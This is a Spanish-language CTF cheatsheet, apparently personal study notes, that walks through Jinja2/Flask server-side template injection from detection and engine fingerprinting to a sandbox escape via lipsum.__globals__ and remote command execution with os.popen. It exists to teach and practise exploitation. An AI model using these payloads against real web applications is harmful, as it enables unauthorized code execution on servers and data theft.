---
tipo: cheatsheet
tags: [ctf, web-exploitation, ssti, jinja2, flask, rce, metodologia, pentraze]
actualizado: 2026-08-16
---

# SSTI — de la detección al RCE en Jinja2

**Server-Side Template Injection (SSTI)** ocurre cuando una aplicación web
inserta entrada del usuario directamente dentro de una plantilla y el
motor de plantillas la **evalúa** en vez de tratarla como texto plano. El
patrón de ataque vale para cualquier motor (Jinja2, Twig, Freemarker...) —
lo que cambia entre ellos es el payload concreto de escape del sandbox; el
flujo general es el mismo. Ver [[SSTI1]] para un caso aplicado completo.

## 1. Detección

Probar una expresión matemática dentro de las llaves del motor:

```
{{ 7*7 }}
```

Si la respuesta es `49` en vez de literalmente `{{ 7*7 }}`, el servidor
está evaluando la entrada: hay inyección de plantilla.

## 2. Identificación del motor (fingerprint)

No basta con saber que hay SSTI — el payload de escape depende del motor
y del lenguaje detrás.

```
{{ 7*'7' }}          → 7777777   (Python: int * str repite la cadena)
{{ "hola".upper() }} → HOLA      (métodos de string de Python)
```

Si `7*'7'` da `7777777`, el lenguaje detrás es Python — en otros lenguajes
esa misma expresión daría error o un resultado distinto. Confirmado
Python, el motor casi siempre es **Jinja2** (el que usa Flask). Otros
motores comunes con el mismo tipo de vulnerabilidad: Twig (PHP/Symfony),
Freemarker (Java) — ver [[MOC - Web Pentesting OWASP]] para dónde encaja
SSTI dentro del OWASP Top 10 (A03 — Injection).

## 3. Reconocimiento de objetos vivos

Antes de saltar al escape, vale la pena mirar qué objetos expone el motor
por defecto. En Flask/Jinja2:

```
{{ config }}
```

Expone el objeto `Config` de Flask — confirma que hay acceso a objetos
Python vivos del servidor, no solo a plantillas estáticas. Rara vez
contiene la flag directamente; sirve como punto de apoyo para razonar
sobre qué más hay accesible, no como destino final.

## 4. Escape del sandbox (Jinja2)

Jinja2 bloquea `import` directo, pero no bloquea el acceso a atributos de
los objetos que ya expone. Desde cualquier global "inocente" del motor
(`lipsum`, una utilidad de Jinja2 para generar texto de relleno):

```
{{ lipsum.__globals__ }}
```

Esto expone el diccionario de globales del módulo `jinja2.utils`, que
incluye los módulos importados en ese archivo — entre ellos, **`os`**,
accesible directamente por clave.

**Rutas alternativas de escape** cuando `lipsum` no está disponible:

- `cycler` — otro global de Jinja2 con el mismo patrón de `__globals__`.
- La cadena de subclases de `object`, vía
  `"".__class__.__mro__[1].__subclasses__()` — recorre todas las clases
  cargadas en el proceso hasta encontrar una útil (`subprocess.Popen`,
  por ejemplo). Más verboso, pero funciona incluso cuando los globals
  inmediatos no exponen nada útil.

## 5. RCE

Con `os` accesible por diccionario:

```
{{ lipsum.__globals__['os'].popen('COMANDO').read() }}
```

- Se saca `os` del diccionario de globales por su clave.
- `.popen('COMANDO')` lanza un proceso del sistema.
- `.read()` lee la salida de ese proceso y la devuelve en la respuesta HTTP.

## 6. Reconocimiento antes de leer el archivo

Con RCE conseguido, no asumir el nombre ni la ubicación del archivo de la
flag. Primero reconocer:

```
ls -la
ls -la /
```

y luego `cat` sobre lo que aparezca. Adivinar rutas (`flag.txt`, `/flag`)
sin mirar antes suele fallar o hacer perder tiempo.

## Patrón transferible

**Detección → fingerprint del motor → escape del sandbox → RCE.** Este
flujo se repite en cualquier CTF con SSTI, sea cual sea el motor detrás.
Lo único que cambia de un motor a otro es el payload de escape del paso
4 — el resto de la secuencia es igual.

## Caso aplicado

[[SSTI1]] — primer reto de SSTI resuelto en la sección, ejemplo completo
de este flujo contra Jinja2/Flask.

---

## Navegación

- ⬆️ Carpeta padre: [[_1- Metodologia|1- Metodologia]]
- ⬅️ Anterior: [[Archivos embebidos - datos tras el fin del archivo (unzip y binwalk)]]

## Relacionadas

- [[SSTI1]] — el writeup que estrena esta metodología.
- [[Marco de ataque web - tres movimientos]] — movimiento 3 (lo que puedes manipular), llevado a su extremo cuando lo manipulable es el propio motor de renderizado.
- [[MOC - Web Pentesting OWASP]] — SSTI dentro de A03 Injection del OWASP Top 10.
- [[Identificar codificaciones, cifrados y hashes]] — otro paso de reconocimiento del flujo web, complementario a este.
